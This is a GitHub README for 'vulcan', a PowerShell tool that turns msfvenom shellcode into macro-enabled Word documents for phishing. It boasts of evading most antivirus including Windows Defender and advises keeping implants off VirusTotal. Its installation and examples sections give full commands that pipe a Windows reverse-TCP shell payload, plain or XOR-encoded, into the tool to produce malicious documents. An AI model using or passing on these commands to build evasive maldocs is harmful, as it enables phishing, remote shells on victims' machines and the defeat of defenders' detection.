# vulcan

[![Language](https://img.shields.io/badge/Lang-PowerShell-blue.svg)](https://docs.microsoft.com/en-gb/powershell/)
[![License](https://img.shields.io/badge/License-BSD%203-red.svg)](https://opensource.org/licenses/BSD-3-Clause)

## A `PowerShell` script that simplifies life and therefore... phishing. 🎣

A `PowerShell` script to automate the creation of consitent and efficient macro-enabled `Word` documents. At the time of writing, the `indirect` template yields great results at evading most AVs, including `Windows Defender` in some cases.

This `PowerShell` script is can be viewed as a third-party add-on to [MSFVenom](https://www.offensive-security.com/metasploit-unleashed/msfvenom/) - made possible thanks to [Windows Subsystem for Linux](https://docs.microsoft.com/en-us/windows/wsl/install) - that leverage templates to quickly and easily - *encoded* - create `Word` implants.

Users/stargazers are greatly encouraged toward contributing to improving and extending this project. 🐺

### ⚠️ Do not be a dummy... Do not submit the produced implants to VirusTotal. 🤢

## Features

- `Visual Basic` templating (`.\assets\templates`) -> **do not hesitate to submit more templates**.
- Decoding routines/functions (`.\assets\decoders`) -> **do not hesitate to submit more templates**.
- Fine-tuning of *bloody* `Visual Basic` line-continuation using `-Treshold`.

## Requirements

- [Windows Subsystem for Linux](https://docs.microsoft.com/en-us/windows/wsl/install) with [MSFVenom](https://www.offensive-security.com/metasploit-unleashed/msfvenom/) installed.

## Installation

1. Clone/download `vulcan`:

    ```powershell
    git clone https://github.com/aress31/vulcan
    cd vulcan
    ```

2. Import `vulcan`:

    ```powershell
    . .\Invoke-Vulcan.ps1
    ```

3. Run `vulcan`:

    ```powershell
    wsl --exec msfvenom -p windows/shell/reverse_tcp LHOST=192.168.0.101 LPORT=443 EXITFUNC=thread -f hex | `
        Invoke-Vulcan -OutputDirectory ".\winwords\" -Template ".\assets\templates\indirect.vba"
    ```

> Although obvious, `windows/shell/reverse_tcp LHOST=192.168.0.101 LPORT=443 EXITFUNC=thread` is a placeholder for your own values... 🙄

## Usage

`Get-Help -Name Invoke-Vulcan` is your friend... Your best friend is `Get-Help -Name Invoke-Vulcan -Detailed`. Nonetheless, `Invoke-Vulcan` must be fed a `hex`-formatted shellcode. This can be achieved with:

```powershell
    Get-Content $ShellCode -AsByteStream -Raw | Invoke-Vulcan ...
```

```powershell
    wsl --exec msfvenom ... -f hex | Invoke-Vulcan ...
```

### Examples

- Embed a non-encoded shellcode:

    ```powershell
    wsl --exec msfvenom -p windows/shell/reverse_tcp LHOST=192.168.0.101 LPORT=443 EXITFUNC=thread -f hex | 
            Invoke-Vulcan -OutputDirectory ".\winwords\" -Template ".\assets\templates\indirect.Visual Basic"
    ```

> Although obvious, `windows/shell/reverse_tcp LHOST=192.168.0.101 LPORT=443 EXITFUNC=thread` is a placeholder for your own values... 🙄

- Embed a `XOR`-encoded shellcode:

    ```powershell
    wsl --exec msfvenom -p windows/shell/reverse_tcp LHOST=192.168.0.101 LPORT=443 EXITFUNC=thread -f hex | 
            Invoke-Vulcan -OutputDirectory ".\winwords\" -Template ".\assets\templates\indirect.Visual Basic" -Decoder xor -DecoderPath ".\assets\decoders\xor.vba" -CaesarShift 5
    ```

> Although obvious, `windows/shell/reverse_tcp LHOST=192.168.0.101 LPORT=443 EXITFUNC=thread` is a placeholder for your own values... 🙄

## Sponsor 💓

If you want to support this project and appreciate the time invested in developping, maintening and extending it; consider donating toward my next (cup of coffee ☕/lamborghini 🚗) - as **a lot** of my **personal time** went into creating this project. 😪

It is easy, all you got to do is press the `Sponsor` button at the top of this page or alternatively [click this link](https://github.com/sponsors/aress31). 😁

## Reporting Issues

Found a bug 🐛? I would love to squash it!

Please report all issues on the GitHub [issues tracker](https://github.com/aress31/vulcan/issues).

## Contributing

You would like to contribute to better this project? 🤩

Please submit all `PRs` on the GitHub [pull requests tracker](https://github.com/aress31/vulcan/pulls).

## Acknowledgements

Give to Caesar what belongs to Caesar:

- [MSFVenom](https://www.offensive-security.com/metasploit-unleashed/msfvenom/)

## License

`vulcan` is primarily distributed under the terms of the `BSD 3`.

See [LICENSE](./LICENSE) for details.